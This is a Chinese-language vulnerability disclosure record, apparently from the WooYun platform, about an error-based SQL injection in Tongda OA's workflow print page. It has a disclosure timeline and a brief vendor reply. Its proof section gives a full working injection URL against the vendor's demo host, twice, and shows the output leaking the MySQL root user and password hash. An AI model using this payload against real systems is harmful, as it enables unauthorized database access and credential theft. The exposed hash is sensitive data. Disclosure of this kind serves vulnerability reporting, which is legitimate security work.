wybug_detail: 漏洞详情 披露状态：   									2015-03-24：	细节已通知厂商并且等待厂商处理中									2015-03-26：	厂商已经确认，细节仅向厂商公开									2015-03-29：	细节向第三方安全合作伙伴开放									2015-05-20：	细节向核心白帽子及相关领域专家公开									2015-05-30：	细节向普通白帽子公开									2015-06-09：	细节向实习白帽子公开									2015-06-24：	细节向公众公开  简要描述： 通达哦 详细说明：  官网demo登录:http://www.day900.com/payload一起:http://www.day900.com/general/workflow/list/print/?RUN_ID=3128&FLOW_ID=69&PRCS_ID=1%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23返回: 请联系管理员 错误#1062: Duplicate entry 'localhostroot*91AF99F23C3D4ED85140D100433725DFA52BECEE1' for key 'group_key'SQL语句: select HIDDEN_ITEM from FLOW_PROCESS,FLOW_RUN_PRCS where FLOW_PROCESS.FLOW_ID='69' and FLOW_RUN_PRCS.RUN_ID='3128' and FLOW_RUN_PRCS.USER_ID='ghq' and FLOW_PROCESS.PRCS_ID=FLOW_RUN_PRCS.FLOW_PRCS and FLOW_RUN_PRCS.PRCS_ID=1 and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)文件：/general/workflow/list/print.php   漏洞证明：  payload一起:http://www.day900.com/general/workflow/list/print/?RUN_ID=3128&FLOW_ID=69&PRCS_ID=1%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23返回: 请联系管理员 错误#1062: Duplicate entry 'localhostroot*91AF99F23C3D4ED85140D100433725DFA52BECEE1' for key 'group_key'SQL语句: select HIDDEN_ITEM from FLOW_PROCESS,FLOW_RUN_PRCS where FLOW_PROCESS.FLOW_ID='69' and FLOW_RUN_PRCS.RUN_ID='3128' and FLOW_RUN_PRCS.USER_ID='ghq' and FLOW_PROCESS.PRCS_ID=FLOW_RUN_PRCS.FLOW_PRCS and FLOW_RUN_PRCS.PRCS_ID=1 and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)文件：/general/workflow/list/print.php   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-03-26 10:50 厂商回复： 2013版早已停止销售 最新状态： 暂无
